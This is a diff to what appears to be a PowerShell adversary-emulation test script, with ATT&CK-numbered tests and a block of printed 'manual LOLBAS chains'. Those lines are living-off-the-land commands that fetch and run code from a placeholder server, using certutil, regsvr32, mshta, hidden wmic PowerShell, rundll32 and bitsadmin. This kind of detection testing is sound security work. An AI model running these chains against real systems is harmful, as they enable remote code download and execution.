@@ -109,7 +109,7 @@ Run-Test -ID "W-028" -Technique "T1059.001" -TestName "PowerUp Invoke-AllChecks"
 # T1197 — BITS Jobs
 Run-Test -ID "W-029" -Technique "T1197" -TestName "Bitsadmin Download (cmd)" -TestNumber 1
 Run-Test -ID "W-030" -Technique "T1197" -TestName "Bitsadmin Download (PowerShell)" -TestNumber 2
-Run-Test -ID "W-031" -Technique "T1197" -TestName "Persist, Download, & Execute" -TestNumber 3
+Run-Test -ID "W-031" -Technique "T1197" -TestName "Persist, Download, and Execute" -TestNumber 3
 
 # T1059.003 — Command and Scripting Interpreter: Windows Command Shell
 Run-Test -ID "W-032" -Technique "T1059.003" -TestName "Create and Execute Batch Script" -TestNumber 1
@@ -550,7 +550,7 @@ Write-Host " MANUAL LOLBAS CHAINS — run these manually" -ForegroundColor Yello
 Write-Host "================================================" -ForegroundColor Yellow
 Write-Host "LOL-01: certutil -urlcache -split -f http://YOUR_SERVER/test.dll C:\temp\test.dll" -ForegroundColor White
 Write-Host "        regsvr32.exe /s /n /u /i:http://YOUR_SERVER/test.sct scrobj.dll" -ForegroundColor White
-Write-Host 'LOL-02: mshta.exe vbscript:Execute("CreateObject(chr(87)&chr(115)&chr(99)&chr(114)&chr(105)&chr(112)&chr(116)&chr(46)&chr(83)&chr(104)&chr(101)&chr(108)&chr(108)).Run ""powershell -enc aQBkAA=="":close")' -ForegroundColor White
+Write-Host "LOL-02: mshta.exe vbscript:Execute(CreateObject(WScript.Shell).Run powershell -enc aQBkAA==)" -ForegroundColor White
 Write-Host "LOL-03: wmic.exe process call create `"powershell -nop -w hidden -enc aQBkAA==`"" -ForegroundColor White
 Write-Host "LOL-04: rundll32.exe \\YOUR_SERVER\share\test.dll,DllRegisterServer" -ForegroundColor White
 Write-Host "LOL-05: bitsadmin /transfer job /download /priority normal http://YOUR_SERVER/test.exe C:\temp\test.exe" -ForegroundColor White
